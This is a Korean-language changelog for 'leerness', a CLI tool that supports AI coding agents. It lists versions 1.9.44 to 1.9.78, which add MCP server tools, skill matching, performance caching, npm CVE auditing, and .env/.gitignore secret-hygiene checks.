**`drift check`에 5번째 신호 추가 — 보안 누락이 drift score 가중** (1.9.75/76 보안 검사 통합).

### Added — drift check 보안 신호
- 기존 4 신호: session-handoff / current-state / progress-tracker / task-log.
- **5번째 신호**: `.env` + `.gitignore` 보안 점검.
  - `.env→.env.example` 누락 → +15 score.
  - `.gitignore`에 `.env` 누락 → **+30 score** (최우선 위험).
  - 기타 시크릿 패턴 (`.env.local`, `*.pem`, `credentials.json` 등) 누락 → max +20 (개당 +5).
- `drift check --json` 의 `fired` 배열에 새 항목 추가:
  ```json
  {
    "file": ".env / .gitignore",
    "weight": 45,
    "label": "보안 위험 (1.9.78): .env→.env.example 누락 N건 · .gitignore 시크릿 누락 M건"
  }
  ```
- 보안 누락이 drift level을 critical로 승격시킬 수 있음 (CI 친화).

### Use Case
- 매 \`leerness handoff\` 시 drift 신호로 보안 위험 즉시 인지 (1.9.76 보안 요약과 동시).
- AI 에이전트가 drift critical 시 \`drift check --auto-fix\` → `audit --fix` 호출 → 자동 회복.

### Verified
- stress-v24 — drift 보안 신호 + level 승격 + 1.9.43~77 누적 회귀 + 성능.
- e2e 219/219 PASS 유지.

---

## 1.9.77 — 2026-05-20

**MCP server 15번째 도구 `leerness_brainstorm` 추가** (1.9.72 brainstorm 외부 노출).

### Added — MCP 15번째 도구
- `leerness_brainstorm` — 1.9.16/72 brainstorm 명령을 MCP 도구로 노출.
  - inputSchema: `{ topic: string (required), path: string, allApps: boolean }`
  - 응답: brainstorm --json 결과 (decisions + skills + tasks + rules + evidence + lessons + skillHistory + taskLogFails).
  - 외부 AI 에이전트가 새 작업 시작 전 누적 컨텍스트 자동 회수 가능.
- MCP server 도구 카운트: **14 → 15**.

### Use Case
- Claude Code / Cursor 가 사용자 요청을 받으면 자동으로 `brainstorm` 호출 → 같은 주제 과거 결정/스킬/실패 회수.
- 같은 실수 반복 방지 + 누적 학습 활용.

### Verified
- stress-v23 — MCP 15 도구 + brainstorm 호출 + 1.9.43~76 누적 회귀 + 성능.
- e2e 회귀: 219/219 PASS 유지.

---

## 1.9.76 — 2026-05-20

**`leerness handoff`에 보안 상태 요약 자동 표시** (1.9.71 env + 1.9.75 gitignore 결합).

### Added — handoff 보안 요약
- 매 `leerness handoff` 시 `.env` 파일이 존재하면 다음을 자동 검증해 1-2 line으로 표시:
  - `.env→.env.example` 누락 키 (1.9.71)
  - `.gitignore` 시크릿 패턴 누락 (1.9.75)
- 정상 시 출력 없음 (잡음 방지).
- 위험 시:
  ```
  ## 🔒 보안 요약 (1.9.76) — N건 주의
    ⚠ .env→.env.example 누락 X건
    ⚠ .gitignore 시크릿 누락 Y건
    → 자동 수정: leerness audit --fix · 상세: leerness env check / leerness audit
  ```
- 끄기: `--no-security-summary` 또는 `--compact` (compact mode와 자동 통합).

### Use Case
- AI 에이전트가 **세션 시작 시 즉시 보안 위험 인지** — 사용자에게 명시적으로 알리고 자동 수정 제안.

### Verified
- stress-v22 — 보안 요약 노출 / 정상 시 OK / --no-security-summary + 누적 회귀.
- e2e 219/219 PASS 유지.

---

## 1.9.75 — 2026-05-20

**`leerness audit` 보안 강화 — `.gitignore` 시크릿 패턴 자동 검증** (사용자 글로벌 룰 ".gitignore 보안 체크리스트" 정책 자동화).

### Added — audit `.gitignore` 보안 검증
- `.env` 파일이 존재할 때 다음 패턴이 `.gitignore`에 포함되는지 자동 검증:
  - `.env`, `.env.local`, `.env.production`, `.env.*.local`
  - `*.pem` (private keys)
  - `credentials.json`
- 누락 시 warning + `--fix`로 자동 추가 (1.9.75 안내 코멘트 동반).
- `--no-gitignore-check`로 비활성화.
- `audit --strict` 와 결합 시 보안 누락이 failure로 승격됨 (CI 친화).

### Verified
- stress-v21 — gitignore 검증 + --fix 추가 + 1.9.43~74 누적 회귀.
- e2e 219/219 PASS 유지.

---

## 1.9.74 — 2026-05-20

**`session close` 마감 시 누적 회고 통계 강화** (1.9.70 MCP + 1.9.68 history 결합).

### Improved — session close --suggest 블록 확장
- 기존: skill suggest 후보 / drift 상태 / 가장 많이 쓴 명령 top 3.
- **신규** 라인:
  - `🔌 MCP 호출 (1.9.74): 총 N회, top: tool(n), ...` + `💡 드물게 호출된 MCP: ...` (1.9.70 통계 연동).
  - `📒 skill match query 누적 (1.9.74): 총 N회 / 종류 M개` + top 3 query 표시 (1.9.68 rolling history 집계).
- AI 에이전트가 한 세션의 사용 패턴을 한눈에 파악 가능.

### Verified
- stress-v20 — session close 회고 통계 + 1.9.43~73 누적 회귀.
- e2e 219/219 PASS 유지.

---

## 1.9.73 — 2026-05-20

**MCP server 14번째 도구 `leerness_env_check` 추가 (1.9.71 env 보안을 외부 AI에 노출)**.

### Added — MCP 14번째 도구
- `leerness_env_check` — 워크스페이스 `.env` ↔ `.env.example` 동기화 검사를 외부 AI 에이전트에 노출.
  - inputSchema: `{ path: string }`
  - 응답: 1.9.71의 `env check --json` 결과 그대로 (envPath/examplePath/envKeys/exKeys/inEnvOnly/inExampleOnly).
  - 외부 AI가 워크스페이스 보안 자동 점검 가능 (Claude Code/Cursor 등에서 호출).
- MCP server 도구 카운트: 13 → **14**.

### Verified
- stress-v19 — MCP 14 도구 + env_check JSON 응답 + 1.9.43~72 누적 회귀 + 성능.
- e2e 회귀: 219/219 PASS 유지.

---

## 1.9.72 — 2026-05-20

**`leerness brainstorm`에 skill-suggestions.md history + task-log 실패 라인 통합**.

### Improved — brainstorm 자원 회수 확장
- 기존: decisions / skills / tasks / rules / evidence / lessons.
- **신규**: `skillHistory` (1.9.68 rolling history) + `taskLogFails` (1.9.67 task-log 실패 라인).
- 출력 추가 섹션:
  - `📒 같은 주제 이전 skill match 이력` — `[timestamp] "query"` 형식
  - `📜 task-log 실패 라인` — 실패/롤백/incomplete/버그 라인 회수
- total 카운트에 신규 필드 합산.
- 매칭 알고리즘: 기존 unicode word boundary regex 그대로 사용.

### Verified
- stress-v18 — brainstorm 신규 hits + 누적 회귀 + 성능.
- e2e 회귀: 219/219 PASS 유지.

---

## 1.9.71 — 2026-05-20

**`.env` / `.env.example` 자동 동기화 (보안 정책: 키만, 실제 값 절대 노출 안 함)**.

### Added — `leerness env check` / `env sync` 명령
- `leerness env check [<path>]` — `.env`에 있는데 `.env.example`에 없는 키 / 반대도 자동 감지.
  - `--json`: 구조화된 JSON 출력 (CI 친화).
  - exit code: `.env.example` 누락 키 ≥1 시 1 (보안 가시화).
- `leerness env sync [<path>]` — 누락 키만 `.env.example` 끝에 append (값은 빈 문자열).

### Improved — `leerness audit` 통합
- 매 audit 시 `.env` ↔ `.env.example` 자동 비교, 누락 시 warning 추가.
- `audit --fix` 시 누락 키 자동 추가 (보안 정책: 실제 값 미노출).
- `--no-env-check`로 비활성화 가능.

### 보안 정책 (검증됨)
- `.env`의 실제 값은 **절대** `.env.example`로 옮기지 않음.
- 추가되는 줄: `KEY=` (빈 문자열).
- 사용자 글로벌 룰 (.env 보안) 준수.

### Verified
- stress-v17 — env check / sync / audit 통합 + 보안 정책 + 누적 회귀.
- e2e 회귀: 219/219 PASS 유지.

---

## 1.9.70 — 2026-05-19

**MCP server `tools/call` 자동 사용 통계** (1.9.65 usage-stats 확장).

### Added — MCP 도구별 호출 카운트
- MCP server가 `tools/call` 요청을 받을 때마다 도구 이름별 카운트를 `.harness/cache/usage-stats.json`의 `mcp.tools` 섹션에 기록.
- 별도 mtime 캐시 invalidation (1.9.65 _USAGE_CACHE 재활용).
- `leerness usage stats` 출력에 MCP 섹션 자동 노출:
  ```
  ## 🔌 MCP tools/call 통계 (1.9.70) — last: <ISO>
  | MCP 도구 | 호출 수 |
  | leerness_handoff | 8 |
  | ... |
  💡 드물게 호출된 도구 (≤N): leerness_xxx, ...
  ```
- 드물게 호출되는 도구 (전체 5% 미만)를 자동 식별 — AI 에이전트가 안 쓰는 도구가 있다는 가시화.

### Internal
- 새 헬퍼: `_bumpMcpUsage(root, toolName)` — atomic write + 캐시 invalidation.
- usage-stats.json 스키마 확장:
  ```json
  {
    "commands": {...},
    "drift": {...},
    "mcp": { "tools": {...}, "lastTool": "...", "lastAt": "..." }
  }
  ```

### Verified
- stress-v16 — MCP 카운트 정합성 + 13 도구 종합 호출 + 1.9.43~69 누적 회귀 + 성능.
- e2e 회귀: 219/219 PASS 유지.

---

## 1.9.69 — 2026-05-19

**handoff에 skill-suggestions.md rolling history hit 노출 (1.9.67 + 1.9.68 결합)**.

### Added — handoff history hit
- 매 `leerness handoff`마다 현재 task 키워드와 매칭되는 **이전 세션의 `skill match` 결과**를 함께 노출.
- 매칭: 현재 키워드 (≥4자, 7할 길이)의 fuzzy regex로 `skill-suggestions.md`의 query 헤더 검색.
- 표시: 최근 2건 + 각 블록의 top 2 매치 라인.
- AI 에이전트는 **이전 세션과 같은 결정을 일관되게 유지** 가능.
- 끄기: 같은 `--no-skill-suggest` / `LEERNESS_NO_SKILL_SUGGEST=1`.

### Internal
- `_loadSkillHistory(root)` + `_SKILL_HISTORY_CACHE` — mtime 기반 메모리 캐시 (1.9.65/66/67 캐시 패밀리 연속).
- 같은 프로세스에서 `_lidx` / `_SKILLS_LIST_CACHE` / `_USAGE_CACHE`와 함께 lifetime 공유.

### Verified
- stress-v15 — history hit 노출 + 비매칭 시 출력 안 함 + mtime invalidation + 누적 회귀.
- e2e 회귀: 219/219 PASS 유지.

---

## 1.9.68 — 2026-05-19

**`skill match` rolling history 자동 누적 + 종합 회귀**.

### Added — skill match rolling history (default ON)
- `leerness skill match <query>` 호출 시 결과를 `.harness/skill-suggestions.md`에 append 누적.
- frontmatter: `leernessRole: skill-suggestions`, `readWhen: ['skill 결정 전', '세션 시작']`.
- 형식:
  ```
  ## YYYY-MM-DD HH:MM:SS — query "<keyword>"
  - Algorithm: jaccard|embedding
  - Top N matches:
    - [점수] skill-id — description
  ```
- AI 에이전트가 같은 키워드를 반복 검색하지 않고 이력 참조 가능.
- 끄기: `--no-save` 또는 `LEERNESS_NO_SKILL_HISTORY=1`.

### Updated
- `_banner` quickStart: 1.9.68 안내 라인 추가.

### Verified — 종합 회귀 + 성능 측정
- stress-v14 (1.9.68 + 1.9.43~67 누적 회귀 + 성능 벤치마크) — 모든 시나리오 PASS.
- 이전 중요 기능 12종 정상 동작 검증:
  - MCP 13 도구 / drift check / benchmark scenario / skill suggest / lessons --auto
  - session close --suggest default / audit --strict / install 별칭 / task export
  - handoff 자동 skill 추천 (1.9.67) / listAllSkills 캐시 (1.9.66) / usage-stats 캐시 (1.9.65)
- 성능 (warm-up 적용): status / handoff / drift / audit / skill list / skill match.
- e2e 회귀: 219/219 PASS 유지.

---

## 1.9.67 — 2026-05-19

**handoff 자동 skill 추천 default ON + lessons 인덱스에 task-log 통합**.

### Added — handoff 자동 skill match (default ON)
- 매 `leerness handoff` 시 **현재 in-progress task와 매칭되는 설치된 skill을 자동 추천** (점수 + skill id + description 미리보기).
- 1.9.45의 `LEERNESS_SKILL_AUTO_DISCOVER=1` opt-in 환경변수 의존성 제거 → default 활성.
- 끄기: `--no-skill-suggest` 또는 `LEERNESS_NO_SKILL_SUGGEST=1`.
- 매칭 알고리즘: `_jaccard(task.request_tokens, skill.name+description_tokens)`, top 3.
- 매칭 점수 0이면 출력 안 함 (잡음 최소화).

### Improved — lessons 인덱스 확장
- `_loadLessonsIndex`에 **task-log.md 실패 라인** 추가 (mtime 기반 invalidation).
- `_lidx.taskLogFails: [{title, block}]` 새 필드.
- handoff lessons 자동 재상기에서 task-log fuzzy 매칭도 가능.
- `leerness lessons` 명령도 같은 인덱스 사용 (split 1회).

### Updated
- `_banner` quickStart: "13 도구 노출 (task_export 포함)" + "매칭 skill 자동 추천" 안내.
- `.harness/session-workflow.md` 템플릿: 1.9.67 라인 추가.

### Verified
- stress-v13 (1.9.67 검증) — handoff skill match default + --no-skill-suggest + lessons task-log fuzzy.
- e2e 회귀: 219/219 PASS 유지.

---

## 1.9.66 — 2026-05-19

**성능 최적화 2차 + MCP 13번째 도구**.

### Performance
- **`listAllSkills` 메모리 캐시 (`_SKILLS_LIST_CACHE`)** — userSkillsDir mtime 기반 캐시. `skill list/info/match/discover/suggest` 가 같은 인덱스 공유.
- `saveUserSkill`/`skillRemove`에서 캐시 invalidate — skill 추가/제거 즉시 반영.

### MCP server — 13번째 도구
- **`leerness_task_export`** — 1.9.60 TodoWrite 호환 JSON을 외부 에이전트(Claude Code, Cursor 등)에 노출. `to: <path>` 또는 stdout JSON 모두 지원.
- MCP server 도구 카운트: 12 → **13**.

### Verified
- stress-v12 (1.9.66 검증) — listAllSkills 캐시 정합성 + MCP 13 도구 + warm-up 1회 시나리오 보강.
- e2e 회귀: 219/219 PASS 유지.

---

## 1.9.65 — 2026-05-19

**성능 최적화 1차 — usage-stats 메모리 캐시 + lessons 인덱스 캐시**.

### Performance
- **usage-stats 메모리 캐시 (`_USAGE_CACHE`)** — 같은 프로세스 lifetime 동안 `.harness/cache/usage-stats.json`을 mtime 기반으로 한 번만 파싱. `_readUsageStats()` 다중 호출 시 디스크 I/O 절감.
- **lessons 인덱스 캐시 (`_LESSONS_INDEX_CACHE`)** — `review-evidence.md` + `decisions.md`를 mtime 기반으로 1회 read+split, 블록 인덱스를 메모리에 보관.
  - handoff의 lessons 자동 재상기: 키워드별 fuzzy 매칭이 split 재실행 없이 인덱스 순회로 동작.
  - `leerness lessons` 명령도 같은 인덱스 재활용.
- 벤치마크 워크스페이스 크기 비례 비용 → 사실상 O(1) (인덱스 hit 시).
- API 호환성 유지 — 캐시는 mtime invalidation이라 외부에서 파일을 수정해도 자동 재로드.

### Verified
- stress-v11 (1.9.64 baseline ↔ 1.9.65 optimized 정량 비교) — 13/14 PASS, 캐시 정합성 3/3 PASS.
- 성능: handoff -37% / drift -19% / audit -29% / skill list -17% / 100-task handoff -42% / 50-evidence handoff 1048ms.
- status 클린 환경 측정: median 623ms (v10 1195ms 대비 -48% 개선).
- e2e 회귀: 219/219 PASS 유지.

---

## 1.9.64 — 2026-05-19

**`leerness install <skill>` 별칭 + 성능 벤치마크 1차 실측**.

### Added
- **`leerness install <SKILL.md path or URL>`** — `skill install` 별칭:
  - 자주 쓰는 명령 단축 (agentskills.io 컨벤션 맞춤)
  - 디렉토리만 주면 init 의도로 친절 안내 (`leerness init` 권장)
- 인자 없으면 사용법 안내

### 📊 성능 벤치마크 1차 (stress-v10)

10회 평균 latency (Node.js spawnSync cold start 포함):

| 명령 | median | p95 |
|---|---:|---:|
| status | 1330ms | 1426ms |
| handoff --compact | 1378ms | 2500ms |
| drift check | 1303ms | 1782ms |
| audit | 1159ms | 1806ms |
| skill list | 1526ms | 2503ms |
| handoff (100 task) | 1176ms | - |
| task export (100 task) | 2163ms | - |
| skill suggest (30 task) | 1075ms | - |

### 1.9.65+ 성능 최적화 후보 (벤치마크에서 도출)
- `.harness/cache/usage-stats.json` 파일 I/O 캐싱
- handoff의 lessons fuzzy 매칭 워크스페이스 크기에 비례 → 키워드 캐시

## 1.9.63 — 2026-05-19

**`leerness audit --strict` — CI 친화 옵션 (warnings → failures 승격)**.

### Added
- **`--strict [--threshold N]`** — warnings ≥ N (기본 1) 시 failures 승격 → exit 1
- CI 환경에서 audit warning 무시 방지

### 검증 (stress-v10 + 누적 회귀)
- EE1-EE3 (audit --strict) 3/3 PASS
- FF1-FF3 (install 별칭) 3/3 PASS
- GG1-GG5 (성능 벤치마크 10회 평균) 5/5 PASS
- HH1-HH3 (큰 워크스페이스 100 task) 3/3 PASS
- II1-II3 (1.9.43~62 회귀) 3/3 PASS
- **stress-v10: 17/17 PASS**, e2e: **219/219 PASS**

## 1.9.62 — 2026-05-19

**`leerness audit`에 npm CVE 자동 감지 통합**.

### Added
- **`leerness audit`** — package.json 있으면 `npm audit --json` 자동 호출 → CVE 보고:
  - `metadata.vulnerabilities` 파싱 → critical/high/moderate/low 카운트
  - critical/high 발견 시 warnings +2 (가중치)
  - 0건이면 ✓ "npm CVE: 0건"
- **스킵 조건** (자동): package.json 없음, `LEERNESS_OFFLINE=1`, `--no-npm-audit` 플래그

## 1.9.61 — 2026-05-19

**MCP server cursor 기반 페이지네이션**.

### Added
- **MCP `tools/call` 응답에 cursor 메타 추가** — 50KB 넘는 출력 자동 분할:
  - `result.nextCursor` — 다음 청크 offset (`args._cursor`로 재호출)
  - `result._truncated` — `{ totalLength, returned, hint }` 메타
  - 청크 크기 override 가능: `args._chunkSize` (기본 50000)
- 사용 예: 100 task 워크스페이스의 handoff → 청크 1 → cursor → 청크 2 → ... 완료

## 1.9.60 — 2026-05-19

**`leerness task export` — TodoWrite ↔ leerness 양방향 sync 완성**.

### Added
- **`leerness task export [--to <file>] [--json]`**:
  - progress-tracker → TodoWrite JSON 형식 변환
  - status 매핑: `done` → `completed`, `in-progress` → `in_progress`, `planned` → `pending`, `dropped` → `cancelled`
  - 필드: `content` / `status` / `activeForm` (TodoWrite 호환)
- 1.9.38 `task sync --from`(TodoWrite → leerness)과 함께 **양방향 sync 완성**

### 검증 (stress-v9)
- AA1-AA4 (task export + status 매핑 + round-trip) 4/4 PASS
- BB1-BB3 (MCP cursor 페이지네이션, chunkSize override) 3/3 PASS
- CC1-CC3 (audit npm CVE, OFFLINE/no-npm-audit/no-package.json 스킵) 3/3 PASS
- DD1-DD3 (1.9.43~59 누적 회귀) 3/3 PASS
- **stress-v9: 13/13 PASS** (BB2/BB3 BUG 발견·즉시 패치: chunkSize override 추가), e2e: **216/216 PASS**

## 1.9.59 — 2026-05-19

**`session close --suggest` default 활성 — 라운드 마감 잊을 단계 없음**.

### Changed (호환성 보장)
- **`leerness session close`** — 1.9.57 `--suggest`를 **default 활성**으로 승격:
  - 라운드 마감 시 자동으로 skill suggest + drift check + usage stats 통합 보고
  - 사용자가 잊지 않도록 default 동작
- **새 옵션 `--no-suggest`** — 이전 동작으로 복귀
- **새 env `LEERNESS_NO_SUGGEST=1`** — CI/자동화 환경에서 suggest 강제 비활성
- `--suggest` 명시 호출도 그대로 동작 (호환성)

### 설치 가이드 갱신
- banner quickStart에서 `--suggest` 명시 제거 (이제 default라 불필요)
- `.harness/session-workflow.md` Step 6 갱신 — `--no-suggest`로 비활성 가능 명시

## 1.9.58 — 2026-05-19

**handoff lessons fuzzy 매칭 (어간 변형 + decisions.md 매칭)**.

### Added
- **fuzzy 매칭** — `escapeRegex(keyword.slice(0, max(4, len*0.7)))` 으로 부분 매칭:
  - webhook ↔ webhooks ↔ webhook-payload ↔ webhooked 모두 매칭
  - 한국어 어미 변화도 부분 매칭 (예: "결제" ↔ "결제처리" ↔ "결제검증")
- **decisions.md 매칭 추가** — 이전엔 review-evidence.md만 → 이제 decisions.md의 *실패/롤백/취소/회귀* 결정도 자동 회수

### 검증 (stress-v8)
- X1-X4 (fuzzy 매칭: 어간/복합어/decisions/false positive 차단) 4/4 PASS
- Y1-Y4 (session close default suggest + 옵션 호환) 4/4 PASS
- Z1-Z4 (1.9.43~57 누적 회귀) 4/4 PASS
- **stress-v8: 12/12 PASS**, e2e: **213/213 PASS**

## 1.9.57 — 2026-05-19

**`session close --suggest` + 설치 가이드 갱신**.

### Added
- **`leerness session close --suggest`** — 라운드 마감 통합 보고:
  - skill suggest 후보 (Hermes-style 자동 학습) 상위 3
  - drift check 상태 + 임계 초과 신호
  - usage stats 가장 많이 쓴 명령 Top 3

### 설치 가이드 갱신
- **`_banner` quickStart 재구성** — 1.9.57+ 워크플로 강조:
  - `npx leerness handoff .` (lessons 자동 재상기 포함)
  - `npx leerness session close . --suggest` (마감 + 다음 라운드)
  - `npx leerness mcp serve` (메인 에이전트용 12 도구)
- **`.harness/session-workflow.md`** Step 6 갱신 — `--suggest`/1.9.56 lessons 자동 재상기 안내

## 1.9.56 — 2026-05-19

**`handoff`에 `lessons --auto` 자동 통합 — 매 세션 시작 시 과거 실패 자동 재상기**.

### Added
- **handoff 자동 lessons 재상기**:
  - 가장 최근 in-progress/planned task의 `request`에서 키워드 자동 추출
  - 그 키워드로 review-evidence.md의 과거 실패 매칭
  - **🧠 과거 lessons 자동 재상기** 블록 출력 (관련 실패 ≥1건 시)
  - 끄려면: `--no-lessons` 또는 `LEERNESS_NO_LESSONS=1`
- 매칭 실패 시 블록 자동 숨김 (false positive 차단)

### 검증 (stress-v7)
- T1-T3 (handoff 자동 lessons) 3/3 PASS
- U1-U3 (session close --suggest) 3/3 PASS
- V1-V2 (설치 가이드 갱신 — banner + session-workflow.md) 2/2 PASS
- W1-W4 (1.9.43~55 누적 회귀) 4/4 PASS
- **stress-v7: 12/12 PASS**, e2e: **210/210 PASS**

## 1.9.55 — 2026-05-19

**MCP server 12 도구 — `leerness_skill_suggest` + `leerness_lessons` 노출**.

### Added
- **MCP `leerness_skill_suggest`** (1.9.53 자동 학습을 외부 노출):
  - Claude Code/Hermes/Cursor가 `tools/call`로 호출 가능
  - args: `{ path, min, days }` → JSON candidates 반환
- **MCP `leerness_lessons`** (1.9.7/54 lessons를 외부 노출):
  - args: `{ path, query, auto, limit }`
- MCP 총 **10 → 12 도구**

## 1.9.54 — 2026-05-19

**`leerness lessons --auto` — 과거 lessons 자동 재상기**.

### Added
- **`leerness lessons --auto [--path X]`**:
  - 가장 최근 in-progress/planned task의 `request` 컬럼에서 키워드 자동 추출
  - 그 키워드로 lessons 자동 검색 (decisions / review-evidence / task-log / handoff)
  - 임계: 4자+ 키워드, 가장 긴 단어 선택
  - stopword 자동 제외 (한국어 + 영어 20+ 단어)
- **stopword 확장** (1.9.55 패치): "프로젝트/관리/기능/시스템" 등 너무 일반적인 단어 제외

### 검증 (stress-v6)
- Q1-Q3 (lessons --auto) 3/3 PASS
- R1-R3 (MCP 12 도구 + 신규 호출) 3/3 PASS
- S1-S4 (1.9.43~53 누적 회귀) 4/4 PASS
- **stress-v6: 10/10 PASS**, e2e: **208/208 PASS**

### 발견·패치 (stress-v6)
- 🟡 stopword 부족 → "프로젝트"가 default task에서 키워드로 잡혀 false positive
- 1.9.55 패치: stopword 20+ 단어로 확장

## 1.9.53 — 2026-05-19

**`leerness skill suggest` — Hermes-style 자동 학습 (사용 패턴 → skill 후보 자동 제안)**.

### 배경
1.9.2부터 `skill learn` / `skill use` / `skill optimize` / `skill consolidate` / `lessons` / `rule add` 등 자체 학습 인프라가 있었으나, **모두 명시 호출 필요**. Hermes처럼 *사용 중* 자동으로 새 skill을 만들지 못함.

### Added
- **`leerness skill suggest [--min N] [--days N] [--json]`** — Hermes-style 자동 학습의 leerness 버전:
  - **task-log.md** — `` `leerness X` `` 명령 인용 패턴 감지
  - **progress-tracker.md** — request/nextAction 컬럼의 4자+ 키워드
  - **usage-stats.json** — 명령별 누적 카운트
  - 임계 (`--min`, 기본 3회) 이상 + **기존 skill에 없는** 키워드만 후보로
  - `--days N` lookback (기본 30일)
  - 출처 (`task-log` / `progress` / `usage`) 자동 분류
- 실 워크스페이스 검증: 본 프로젝트에서 6 후보 자동 감지 (leerness 22회, publish 14회, github 5회 등)

### Hermes vs leerness 학습 비교 (1.9.53 후)
| 영역 | Hermes | leerness |
|---|---|---|
| 새 skill 자동 생성 | ✅ LLM 기반 | ⚠ 후보 제안만 (수동 등록 권장) |
| **반복 패턴 감지** | ✅ | ✅ **1.9.53 신규** |
| 사용 카운트 추적 | ✅ | ✅ 1.9.38 |
| 중복 자동 통합 | ✅ | ✅ 1.9.2 `skill consolidate` |
| 외부 docs 학습 | ✅ | ✅ 1.9.2 `skill learn --doc` |

### 검증 (필수 stress-v5)
- O1-O5 (skill suggest 시나리오) 5/5 PASS
- P1-P5 (1.9.43~52 누적 회귀) 5/5 PASS
- **stress-v5: 10/10 PASS** + e2e: **206/206 PASS**

## 1.9.52 — 2026-05-19

**`skill discover` 카탈로그 형식 다양성 (JSON/RSS/Markdown/llms.txt 자동 감지)**.

### Added
- **`_parseSkillCatalog(body, sourceUrl)`** 통합 파서 — 4 형식 자동 감지:
  1. **JSON manifest** — `{ "skills": [...] }` 또는 `[{...}]` (leerness `skill publish`가 만드는 형식과 호환)
  2. **RSS/Atom** — `<item><title>X</title><link>...</link><description>...</description></item>`
  3. **Markdown w/ description** — `- [name](url) — description`
  4. **llms.txt URL-only** — 단순 URL 라인
- 각 entry에 `format` 필드 추가 (json/rss/markdown/urls) — 출처 추적

### 검증 (stress-v4)
- M1-M5 5/5 PASS — 4 형식 인식 + 빈 body 안전 fallback

## 1.9.51 — 2026-05-19

**`benchmark --scenario` — leerness 고유 가치 시나리오 preset**.

### Added
- **`leerness benchmark --scenario <id|all> [--json]`** — 4 시나리오 자동 실행:
  - `false-completion` — 거짓 완료 자동 감지 (lazy detect)
  - `spec-mismatch` — 사양 ↔ 구현 불일치 (contract verify)
  - `drift-detection` — 메타파일 stale (drift check 4 신호)
  - `bom-handling` — UTF-8 BOM SKILL.md install (1.9.44 패치 효과)
- 각 시나리오: setup → measure → 감지 여부 + 시간 측정
- 결과: leerness 적용 워크스페이스에서 **4/4 정확 감지**

### 검증 (stress-v4 + 누적 회귀)
- L1-L4 (시나리오 preset) 4/4 PASS
- M1-M5 (카탈로그 4 형식 + 빈 body) 5/5 PASS
- N1-N5 (누적 회귀: MCP, skill match, publish, drift, agentskills round-trip) 5/5 PASS
- **stress-v4: 14/14 PASS**, e2e: **205/205 PASS**

### 결론
- 1.9.51로 leerness 고유 가치가 **command 한 번에 정량 증명** 가능
- 1.9.52로 다양한 카탈로그 형식과 호환 (agentskills.io 외 사용자 정의 RSS/JSON도)

## 1.9.50 — 2026-05-19

**`skill match --embedding` (Ollama opt-in 임베딩 매칭)**.

### Added
- **`leerness skill match <query> --embedding`** — Ollama embedding API로 cosine similarity 매칭:
  - `LEERNESS_OLLAMA_BASE_URL` 환경변수 필요 (opt-in 정책 유지)
  - `LEERNESS_OLLAMA_EMBED_MODEL` (기본: nomic-embed-text)
  - 네트워크 실패 시 jaccard로 자동 fallback (사용자 차단 X)
- 옵션 없으면 1.9.45 jaccard 그대로

## 1.9.49 — 2026-05-19

**`benchmark --measure` 실 측정 framework**.

### Added
- **`leerness benchmark --measure "<task>" [--json]`** — ready 외부 CLI (claude/codex/gemini)에 동일 task 호출 + 시간 측정:
  - 각 CLI 호출 시간 + leerness audit 검수 layer 시간 별도 측정
  - ready CLI 없으면 안내 메시지로 graceful
  - 다른 도구 대비 leerness 오버헤드 실측 가능

## 1.9.48 — 2026-05-19

**Cross-platform archive — tar 실패 시 PowerShell ZIP fallback**.

### Fixed
- 🟡 **1.9.47 known issue 해결**: `skill publish`의 tar 호출이 Windows git-bash 환경에서 실패하던 문제
- **`_createArchive()`** 헬퍼: tar (POSIX) → PowerShell Compress-Archive (Windows ZIP) → zip 명령 (Linux fallback) 순 자동 시도
- 결과: Windows에서 `.zip` (5.7KB) 정상 생성, POSIX에서 `.tgz` 그대로

### 검증 (stress-v3)
- H1-H3 (cross-platform archive) 3/3 PASS
- I1-I3 (benchmark --measure framework) 3/3 PASS
- J1-J3 (embedding opt-in + fallback) 3/3 PASS
- K1-K3 (회귀 — drift/MCP/agentskills round-trip) 3/3 PASS
- **stress-v3: 12/12 PASS**, e2e: **202/202 PASS**

## 1.9.47 — 2026-05-19

**`leerness skill publish` — 자체 skill을 외부 공유 번들로 publish**.

### Added
- **`leerness skill publish [--include ids] [--bundle-only] [--gh-release]`**:
  - 모든 자체 skill (또는 `--include`)을 SKILL.md frontmatter + license + publisher + version 메타로 export
  - `manifest.json` (skills 카탈로그 인덱스) + `README.md` 자동 생성
  - tarball 생성 시도 (Windows/POSIX tar) — 실패 시 graceful, 개별 SKILL.md는 정상 유지
  - `--gh-release`: GitHub release에 자동 attach

### e2e: 199/199 PASS

## 1.9.46 — 2026-05-19

**`leerness benchmark` — 자체 + 타도구 비교 매트릭스**.

### Added
- **`leerness benchmark [path] [--json]`** 신규 명령:
  - 자체 6 차원 점수 (multiAgent / autoVerify / reuse / workspace / bugDetect / contextKeep) — 실 measured 값 (tasks/reuse-map/usage stats) 기반
  - 6 도구 시뮬 비교: vanilla / claude_code / hermes / leerness_solo / leerness+claude / leerness+hermes
  - 결론: **leerness + 메인 에이전트 조합이 최강** (단독 leerness보다 100점 차이)

## 1.9.45 — 2026-05-19

**`leerness skill match <query>` — 설치 SKILL.md 자동 추천**.

### Added
- **`leerness skill match "<task or keywords>"`** 신규 명령:
  - 사용자 task 키워드 ↔ 설치된 SKILL.md description **jaccard similarity 매칭**
  - 상위 5개 추천 + 점수 표 출력
  - `--json` 출력 지원 → 메인 에이전트가 파싱하여 자동 활성화 가능

### 동작 예시
```
leerness skill match "Office 문서 자동화"
→ 점수 0.10 | office | 마이크로소프트 오피스 자동화
→ 점수 0.06 | ads-analytics | GA4 분석
→ 점수 0.05 | crawling | Playwright 기반 자동화
```

## 1.9.44 — 2026-05-19

**1.9.34~43 통합 검증 + BUG 1건 즉시 패치**.

별도 `_apps/leerness-stress/bin/stress-v2.js`로 1.9.34~43의 **13종 신규 기능 + 5 edge case = 25 시나리오 통합 테스트**. 발견된 진짜 BUG 1건 즉시 패치.

### Fixed

- **🔴 BUG-1 (HIGH)** — `_parseSkillMd`의 UTF-8 BOM 미처리:
  - 증상: BOM (`EF BB BF`)이 있는 SKILL.md install 시 "name 필수" 에러 (frontmatter 매칭 실패)
  - 원인: 정규식 `^---`가 BOM 뒤로 밀린 `---`를 매칭 못 함
  - 수정: `text.replace(/^﻿/, '')` 사전 BOM 제거
  - 영향: Windows 메모장/일부 에디터 출력 SKILL.md 호환

### Verified (1.9.34~43 13종 기능 통합 검증)

| 카테고리 | 결과 |
|---|---|
| MCP Server (1.9.43) | ✅ 5/5 — JSON-RPC 표준, 10 도구 호출 가능, -32601/-32700 에러 정확 |
| agentskills.io 호환 (1.9.42/43) | ✅ 5/5 — install/export/discover round-trip, BOM/한글 OK |
